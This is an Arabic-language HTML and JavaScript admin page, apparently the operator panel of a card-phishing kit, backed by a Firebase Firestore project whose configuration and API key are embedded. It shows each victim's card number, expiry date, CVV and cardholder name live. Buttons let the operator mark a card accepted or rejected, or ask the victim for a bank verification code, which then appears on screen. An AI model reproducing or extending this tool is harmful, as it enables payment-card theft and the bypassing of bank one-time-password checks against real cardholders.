<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>لوحة تحكم المسؤول - إدارة البطاقات</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        :root { --primary: #1a56db; --bg: #f3f4f6; --white: #ffffff; }
        body { font-family: 'Segoe UI', sans-serif; background-color: var(--bg); margin: 0; padding: 20px; }
        .container { max-width: 1100px; margin: 0 auto; }
        .card-box { background: var(--white); padding: 20px; border-radius: 12px; margin-bottom: 15px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); display: flex; justify-content: space-between; align-items: center; border-right: 5px solid var(--primary); }
        .info { flex: 2; }
        .info b { color: var(--primary); font-size: 18px; }
        .actions { flex: 1; text-align: left; }
        .badge { padding: 5px 10px; border-radius: 5px; font-size: 12px; font-weight: bold; text-transform: uppercase; }
        .status-pending { background: #fef3c7; color: #92400e; }
        .status-otp_required { background: #e0e7ff; color: #3730a3; }
        .status-otp_sent { background: #dcfce7; color: #166534; border: 1px dashed green; }
        .btn { padding: 10px 15px; border: none; border-radius: 6px; cursor: pointer; color: white; margin-left: 5px; transition: 0.2s; }
        .btn-success { background: #10b981; }
        .btn-otp { background: #f59e0b; }
        .btn-error { background: #ef4444; }
        .btn-delete { background: #6b7280; }
        .otp-alert { margin-top: 10px; padding: 10px; background: #ebf5ff; border-radius: 6px; font-size: 18px; font-weight: bold; color: #1e40af; border: 1px solid #1e40af; }
    </style>
</head>
<body>
    <div class="container">
        <h1>لوحة التحكم اللحظية</h1>
        <p>مراقبة البطاقات وطلب أكواد التحقق</p>
        <hr style="margin: 20px 0;">
        <div id="cards-list">جاري تحميل البيانات...</div>
    </div>

<script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-app.js";
    import { getFirestore, collection, query, orderBy, onSnapshot, doc, updateDoc, deleteDoc } from "https://www.gstatic.com/firebasejs/11.1.0/firebase-firestore.js";

    const firebaseConfig = {
        apiKey: "AIzaSyDuTdRONBY01xWrf9qZ81C2UQHg1V-64to",
        authDomain: "vasa-a14ca.firebaseapp.com",
        projectId: "vasa-a14ca",
        storageBucket: "vasa-a14ca.firebasestorage.app",
        messagingSenderId: "1083668938512",
        appId: "1:1083668938512:web:7624c955c0c54d3f7bef95",
        measurementId: "G-1ESJ0J0TZW"
    };

    const app = initializeApp(firebaseConfig);
    const db = getFirestore(app);

    // تحديث الحالة
    window.changeStatus = async (id, newStatus) => {
        await updateDoc(doc(db, "cards", id), { status: newStatus });
    };

    // حذف البطاقة
    window.deleteCard = async (id) => {
        if(confirm('هل أنت متأكد من الحذف؟')) await deleteDoc(doc(db, "cards", id));
    };

    // جلب البيانات لحظياً
    const q = query(collection(db, "cards"), orderBy("createdAt", "desc"));
    onSnapshot(q, (snap) => {
        const container = document.getElementById('cards-list');
        container.innerHTML = '';
        if (snap.empty) container.innerHTML = 'لا توجد بطاقات مسجلة حالياً.';

        snap.forEach(d => {
            const item = d.data();
            const date = item.createdAt ? item.createdAt.toDate().toLocaleString('ar-EG') : '...';
            
            container.innerHTML += `
                <div class="card-box">
                    <div class="info">
                        <span class="badge status-${item.status}">${item.status || 'pending'}</span>
                        <small style="color:gray;"> - ${date}</small><br>
                        <b>الاسم:</b> ${item.cardHolder} | <b>النوع:</b> ${item.cardType}<br>
                        <b>الرقم:</b> <code>${item.cardNumber}</code> | <b>التاريخ:</b> ${item.expiryDate} | <b>CVV:</b> ${item.cvv}
                        ${item.status === 'otp_sent' ? `<div class="otp-alert">كود التحقق المستلم: ${item.otp}</div>` : ''}
                    </div>
                    <div class="actions">
                        <button class="btn btn-success" onclick="changeStatus('${d.id}', 'success')" title="قبول"><i class="fa-solid fa-check"></i></button>
                        <button class="btn btn-otp" onclick="changeStatus('${d.id}', 'otp_required')" title="طلب كود"><i class="fa-solid fa-key"></i></button>
                        <button class="btn btn-error" onclick="changeStatus('${d.id}', 'error')" title="رفض"><i class="fa-solid fa-xmark"></i></button>
                        <button class="btn btn-delete" onclick="deleteCard('${d.id}')" title="حذف"><i class="fa-solid fa-trash"></i></button>
                    </div>
                </div>
            `;
        });
    });
</script>
</body>
</html>
